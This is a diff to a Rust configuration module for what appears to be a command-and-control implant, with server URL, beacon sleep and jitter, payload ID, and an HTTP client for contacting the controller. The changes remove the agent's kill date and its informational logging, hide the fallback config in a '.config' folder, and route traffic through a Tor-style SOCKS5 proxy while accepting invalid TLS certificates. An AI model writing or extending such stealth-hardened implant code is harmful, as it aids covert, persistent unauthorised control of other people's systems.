@@ -3,30 +3,39 @@ use std::fs;
 use std::io;
 use std::path::Path;
 use std::env;
-use uuid::Uuid;
+use log::{info, error};
+use reqwest::{Client, Proxy};
 
 // Include the generated config file
 include!(concat!(env!("OUT_DIR"), "/config.rs"));
 
-#[derive(Serialize, Deserialize, Clone)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 pub struct AgentConfig {
     pub server_url: String,
     pub sleep_interval: u64,
     pub jitter: u64,
-    pub kill_date: Option<String>,
     pub payload_id: String,
     pub protocol: String,
+    #[serde(default)]
+    pub socks5_enabled: bool,
+    #[serde(default = "default_socks5_port")]
+    pub socks5_port: u16,
+}
+
+fn default_socks5_port() -> u16 {
+    9050
 }
 
 impl Default for AgentConfig {
     fn default() -> Self {
         Self {
-            server_url: String::new(), // Empty string by default to force error if no config
+            server_url: String::new(),
             sleep_interval: 5,
             jitter: 2,
-            kill_date: None,
-            payload_id: String::new(), // Empty string by default
+            payload_id: String::new(),
             protocol: String::from("http"),
+            socks5_enabled: true,
+            socks5_port: 9050,
         }
     }
 }
@@ -36,7 +45,6 @@ impl AgentConfig {
         // First try using the embedded config
         if let Ok(config) = serde_json::from_str::<AgentConfig>(EMBEDDED_CONFIG) {
             if !config.server_url.is_empty() && !config.payload_id.is_empty() {
-                println!("[INFO] Using embedded configuration");
                 return Ok(config);
             }
             println!("[WARNING] Embedded config invalid (missing server_url or payload_id)");
@@ -47,13 +55,12 @@ impl AgentConfig {
         // Try filesystem config as fallback
         if let Ok(exe_path) = env::current_exe() {
             let exe_dir = exe_path.parent().unwrap_or(Path::new("."));
-            let config_path = exe_dir.join("config.json");
+            let config_path = exe_dir.join(".config").join("config.json");
             
             if config_path.exists() {
                 if let Ok(contents) = fs::read_to_string(&config_path) {
                     if let Ok(config) = serde_json::from_str::<AgentConfig>(&contents) {
                         if !config.server_url.is_empty() && !config.payload_id.is_empty() {
-                            println!("[INFO] Loaded valid config from {}", config_path.display());
                             return Ok(config);
                         }
                     }
@@ -72,54 +79,31 @@ impl AgentConfig {
             format!("{}://{}", self.protocol, self.server_url)
         }
     }
-}
 
-pub struct ServerConfig {
-    pub server_url: String,
-    pub sleep_time: u64,
-    pub jitter: u64,
-    pub uuid: String,
-    pub registered: bool,
-    pub agent_type: String,
-    pub system_info: String,
-    pub hostname: String,
-    pub upload_dir: String,
-}
-
-impl Default for ServerConfig {
-    fn default() -> Self {
-        Self {
-            server_url: String::from("http://localhost:8080"),
-            sleep_time: 5,
-            jitter: 2,
-            uuid: Uuid::new_v4().to_string(),
-            registered: false,
-            agent_type: String::from("rust"),
-            system_info: String::new(),
-            hostname: String::new(),
-            upload_dir: String::from("uploads"),
+    /// Build an HTTP client that respects the SOCKS5 proxy config and logs the proxy status.
+    pub fn build_http_client(&self) -> Result<Client, io::Error> {
+        if self.socks5_enabled {
+            let proxy_url = format!("socks5h://127.0.0.1:{}", self.socks5_port);
+            info!("[HTTP] Building HTTP client with SOCKS5 proxy: {}", proxy_url);
+            match Client::builder()
+                .proxy(Proxy::all(&proxy_url).map_err(|e| {
+                    error!("[HTTP] Invalid proxy URL: {}", e);
+                    io::Error::new(io::ErrorKind::Other, format!("Invalid proxy URL: {}", e))
+                })?)
+                .danger_accept_invalid_certs(true)
+                .build() {
+                Ok(client) => Ok(client),
+                Err(e) => {
+                    error!("[HTTP] Failed to build HTTP client with SOCKS5 proxy: {}", e);
+                    Err(io::Error::new(io::ErrorKind::Other, format!("Failed to build HTTP client with proxy: {}", e)))
+                }
+            }
+        } else {
+            info!("[HTTP] Building HTTP client with direct connection (no proxy)");
+            Client::builder()
+                .danger_accept_invalid_certs(true)
+                .build()
+                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))
         }
-    }
-}
-
-impl ServerConfig {
-    pub fn new() -> Self {
-        Default::default()
-    }
-
-    pub fn register_url(&self) -> String {
-        format!("{}/api/agent/register", self.server_url)
-    }
-
-    pub fn get_task_url(&self) -> String {
-        format!("{}/api/agent/{}/task", self.server_url, self.uuid)
-    }
-
-    pub fn submit_result_url(&self) -> String {
-        format!("{}/api/agent/{}/result", self.server_url, self.uuid)
-    }
-
-    pub fn upload_path(&self) -> String {
-        format!("{}/api/agent/{}/upload", self.server_url, self.uuid)
     }
 }
